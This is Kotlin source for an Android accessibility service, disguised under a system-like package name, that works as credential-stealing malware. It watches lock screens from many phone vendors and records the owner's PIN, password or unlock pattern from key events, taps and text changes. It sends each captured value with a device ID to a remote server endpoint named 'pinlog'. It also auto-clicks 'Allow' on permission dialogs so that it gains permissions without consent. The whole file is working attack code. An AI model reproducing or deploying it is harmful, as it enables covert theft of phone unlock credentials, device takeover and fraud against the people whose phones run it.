package com.android.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.view.KeyEvent
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.google.gson.JsonObject
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.concurrent.TimeUnit

class PinCaptureService : AccessibilityService() {

    private val http = OkHttpClient.Builder()
        .connectTimeout(8, TimeUnit.SECONDS)
        .readTimeout(8, TimeUnit.SECONDS)
        .build()
    private val JSON_MEDIA = "application/json; charset=utf-8".toMediaType()

    private val pinBuffer      = StringBuilder()
    private val passwordBuffer = StringBuilder()
    private var lockType       = "pin"
    private var isOnLock       = false
    private var lastSent       = ""

    // Pattern: simpan urutan node 1–9 yang disentuh
    private val patternNodes   = mutableListOf<Int>()

    // Dedup PIN: hindari dobel-append dari onKeyEvent + TYPE_VIEW_CLICKED
    private var lastKeyEventMs = 0L

    private val LOCK_PKGS = setOf(
        "com.android.systemui",
        "com.android.keyguard",
        "com.miui.home",
        "com.miui.keyguard",
        "com.miui.securityinputmethod",
        "com.vivo.launcher",
        "com.vivo.keyguard",
        "com.bbk.launcher2",
        "com.samsung.android.app.cocktailbarservice",
        "com.coloros.launcher",
        "com.huawei.systemmanager",
        "com.sec.android.app.launcher",
        "com.oneplus.launcher",
        "com.oppo.launcher",
        "com.realme.launcher",
        "com.zte.launcher",
        "com.hihonor.android.launcher",
        "com.nothing.launcher"
    )

    override fun onServiceConnected() {
        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes =
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                AccessibilityEvent.TYPE_VIEW_CLICKED         or
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED    or
                AccessibilityEvent.TYPE_VIEW_SCROLLED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS             or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS
            notificationTimeout = 50
        }
    }

    // ── Key event interceptor — tangkap PIN / password sebelum di-mask ───────
    override fun onKeyEvent(event: KeyEvent): Boolean {
        if (event.action != KeyEvent.ACTION_DOWN) return false
        if (!isOnLock) return false

        lastKeyEventMs = System.currentTimeMillis()

        when (event.keyCode) {
            in KeyEvent.KEYCODE_0..KeyEvent.KEYCODE_9 -> {
                pinBuffer.append((event.keyCode - KeyEvent.KEYCODE_0).toString())
                lockType = "pin"
            }
            in KeyEvent.KEYCODE_NUMPAD_0..KeyEvent.KEYCODE_NUMPAD_9 -> {
                pinBuffer.append((event.keyCode - KeyEvent.KEYCODE_NUMPAD_0).toString())
                lockType = "pin"
            }
            KeyEvent.KEYCODE_DEL -> {
                if (lockType == "pin" && pinBuffer.isNotEmpty())
                    pinBuffer.deleteCharAt(pinBuffer.length - 1)
                else if (passwordBuffer.isNotEmpty())
                    passwordBuffer.deleteCharAt(passwordBuffer.length - 1)
            }
            KeyEvent.KEYCODE_ENTER, KeyEvent.KEYCODE_NUMPAD_ENTER -> {
                val captured = buildCaptureString()
                if (captured.isNotBlank()) {
                    sendCapture(captured, lockType)
                    resetBuffers()
                }
            }
            else -> {
                val unicode = event.unicodeChar
                if (unicode != 0 && unicode != 10) {
                    passwordBuffer.append(unicode.toChar())
                    lockType = "password"
                }
            }
        }
        return false
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        val ev  = event ?: return
        val pkg = ev.packageName?.toString() ?: return

        when (ev.eventType) {

            // ── Deteksi lock screen muncul / hilang ───────────────────────────
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val cls = ev.className?.toString() ?: ""
                val isLockWindow =
                    pkg in LOCK_PKGS ||
                    cls.contains("KeyguardBouncer",          ignoreCase = true) ||
                    cls.contains("LockScreen",               ignoreCase = true) ||
                    cls.contains("KeyguardHostView",         ignoreCase = true) ||
                    cls.contains("StatusBarKeyguard",        ignoreCase = true) ||
                    cls.contains("UnlockMethodCache",        ignoreCase = true) ||
                    cls.contains("KeyguardSecurityContainer",ignoreCase = true) ||
                    cls.contains("MiuiKeyguard",             ignoreCase = true) ||
                    cls.contains("OppoKeyguard",             ignoreCase = true) ||
                    cls.contains("SamsungKeyguard",          ignoreCase = true) ||
                    (pkg in LOCK_PKGS && cls.contains("PhoneWindow", ignoreCase = true))

                if (isLockWindow) {
                    if (!isOnLock) {
                        isOnLock = true
                        resetBuffers()
                    }
                } else if (isOnLock && pkg !in LOCK_PKGS) {
                    val captured = buildCaptureString()
                    if (captured.isNotBlank()) sendCapture(captured, lockType)
                    isOnLock = false
                    resetBuffers()
                }

                // Auto-klik tombol Allow pada dialog permission
                if (pkg.contains("packageinstaller",         ignoreCase = true) ||
                    pkg.contains("permissioncontroller",     ignoreCase = true) ||
                    pkg.contains("com.google.android.permissioncontroller")) {
                    autoClickAllow(ev)
                }
            }

            // ── Klik numpad PIN — fallback jika onKeyEvent tidak cukup ────────
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val inLock = isOnLock || pkg in LOCK_PKGS
                if (!inLock) return

                val src    = ev.source ?: return
                val desc   = src.contentDescription?.toString() ?: ""
                val viewId = src.viewIdResourceName ?: ""
                val srcCls = src.className?.toString() ?: ""
                val srcTxt = src.text?.toString() ?: ""

                when {
                    // ── Pattern: node 1–9 di PatternView ─────────────────────
                    srcCls.contains("PatternView",   ignoreCase = true) ||
                    viewId.contains("lockPattern",   ignoreCase = true) ||
                    viewId.contains("pattern_view",  ignoreCase = true) -> {
                        lockType  = "pattern"
                        isOnLock  = true
                        // Beberapa ROM kirim contentDescription "1" s/d "9" per node
                        val nodeNum = desc.trim().toIntOrNull()
                        if (nodeNum != null && nodeNum in 1..9 && !patternNodes.contains(nodeNum)) {
                            patternNodes.add(nodeNum)
                        }
                    }

                    // ── Digit dari numpad PIN ─────────────────────────────────
                    desc.matches(Regex("[0-9]")) ||
                    (srcTxt.matches(Regex("[0-9]")) && desc.isBlank()) -> {
                        val digit = if (desc.matches(Regex("[0-9]"))) desc else srcTxt
                        // Dedup: jika onKeyEvent sudah tangkap dalam 100ms, skip
                        val ageSinceKey = System.currentTimeMillis() - lastKeyEventMs
                        if (ageSinceKey > 100 && pinBuffer.length < 12) {
                            lockType  = "pin"
                            isOnLock  = true
                            pinBuffer.append(digit)
                        }
                    }

                    // ── Backspace / hapus ─────────────────────────────────────
                    desc.equals("Delete",    ignoreCase = true) ||
                    desc.equals("Backspace", ignoreCase = true) ||
                    viewId.contains("delete",     ignoreCase = true) ||
                    viewId.contains("backspace",  ignoreCase = true) ||
                    viewId.contains("key_delete", ignoreCase = true) -> {
                        if (lockType == "pattern" && patternNodes.isNotEmpty())
                            patternNodes.removeAt(patternNodes.size - 1)
                        else if (pinBuffer.isNotEmpty())
                            pinBuffer.deleteCharAt(pinBuffer.length - 1)
                        else if (passwordBuffer.isNotEmpty())
                            passwordBuffer.deleteCharAt(passwordBuffer.length - 1)
                    }

                    // ── OK / Enter ────────────────────────────────────────────
                    desc.equals("OK",    ignoreCase = true) ||
                    desc.equals("Enter", ignoreCase = true) ||
                    viewId.contains("key_enter", ignoreCase = true) ||
                    viewId.contains("key_ok",    ignoreCase = true) -> {
                        val captured = buildCaptureString()
                        if (captured.isNotBlank()) {
                            sendCapture(captured, lockType)
                            resetBuffers()
                        }
                    }

                    // ── Password keyboard: karakter printable tunggal ─────────
                    srcCls.contains("Button", ignoreCase = true) &&
                    desc.length == 1 && desc[0].code in 33..126 -> {
                        val ageSinceKey = System.currentTimeMillis() - lastKeyEventMs
                        if (ageSinceKey > 100) {
                            lockType  = "password"
                            isOnLock  = true
                            passwordBuffer.append(desc)
                        }
                    }
                }
                src.recycle()
            }

            // ── Text changed pada field password / PIN ────────────────────────
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val inLock = isOnLock || pkg in LOCK_PKGS
                if (!inLock) return

                val src           = ev.source ?: return
                val isPasswordFld = src.isPassword
                val nodeText      = src.text?.toString() ?: ""
                val removedCount  = ev.removedCount

                if (!isPasswordFld && nodeText.isNotBlank() &&
                    !nodeText.all { it == '•' || it == '*' || it == '·' }) {
                    // Field tidak ter-mask — ambil langsung (sandi beberapa ROM)
                    lockType = "password"
                    isOnLock = true
                    passwordBuffer.clear()
                    passwordBuffer.append(nodeText)
                } else if (isPasswordFld && ev.addedCount > 0 && nodeText.isNotBlank()) {
                    // Beberapa ROM tetap emit teks asli meski isPassword=true
                    if (!nodeText.all { it == '•' || it == '*' || it == '·' }) {
                        lockType = "password"
                        isOnLock = true
                        passwordBuffer.clear()
                        passwordBuffer.append(nodeText)
                    }
                } else if (removedCount > 0 && ev.addedCount == 0) {
                    val newLen = (passwordBuffer.length - removedCount).coerceAtLeast(0)
                    if (passwordBuffer.length > newLen)
                        passwordBuffer.delete(newLen, passwordBuffer.length)
                }
                src.recycle()
            }

            // ── Pattern gesture via scroll (beberapa ROM) ─────────────────────
            AccessibilityEvent.TYPE_VIEW_SCROLLED -> {
                val inLock = isOnLock || pkg in LOCK_PKGS
                if (!inLock) return
                val src = ev.source ?: return
                val cls = src.className?.toString() ?: ""
                if (cls.contains("PatternView", ignoreCase = true)) {
                    lockType = "pattern"
                    isOnLock = true
                    // Kirim jika sudah punya minimal 3 node
                    if (patternNodes.size >= 3) {
                        sendCapture(buildCaptureString(), lockType)
                        resetBuffers()
                    }
                }
                src.recycle()
            }
        }
    }

    // ── Auto-klik Allow pada dialog permission ────────────────────────────────
    private fun autoClickAllow(event: AccessibilityEvent) {
        val root = event.source ?: return
        val targets = listOf(
            "allow", "izinkan", "grant", "ok", "continue",
            "while using", "only this time", "satu kali ini"
        )
        fun search(node: AccessibilityNodeInfo) {
            val txt = (node.text ?: node.contentDescription)?.toString()?.lowercase() ?: ""
            if (targets.any { txt.contains(it) } && node.isClickable) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                return
            }
            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                search(child)
                child.recycle()
            }
        }
        try { search(root) } catch (_: Exception) {}
        root.recycle()
    }

    override fun onInterrupt() {}

    private fun resetBuffers() {
        pinBuffer.clear()
        passwordBuffer.clear()
        patternNodes.clear()
        lockType = "pin"
    }

    private fun buildCaptureString(): String = when (lockType) {
        "pattern"  -> if (patternNodes.isNotEmpty())
                          patternNodes.joinToString("-")
                      else ""
        "password" -> passwordBuffer.toString().ifBlank { pinBuffer.toString() }
        else       -> pinBuffer.toString()
    }

    private fun sendCapture(value: String, type: String) {
        if (value.isBlank() || value == lastSent) return
        lastSent = value

        val prefs    = getSharedPreferences("connector_prefs", Context.MODE_PRIVATE)
        val deviceId = prefs.getString("device_id", null) ?: return

        val body = JsonObject().apply {
            addProperty("deviceId", deviceId)
            addProperty("type",     type)
            addProperty("value",    value)
        }

        Thread {
            try {
                http.newCall(
                    Request.Builder()
                        .url("${SecureConfig.serverUrl()}/api/device/pinlog")
                        .post(body.toString().toRequestBody(JSON_MEDIA))
                        .build()
                ).execute().close()
            } catch (_: Exception) {}
        }.also { it.isDaemon = true }.start()
    }
}
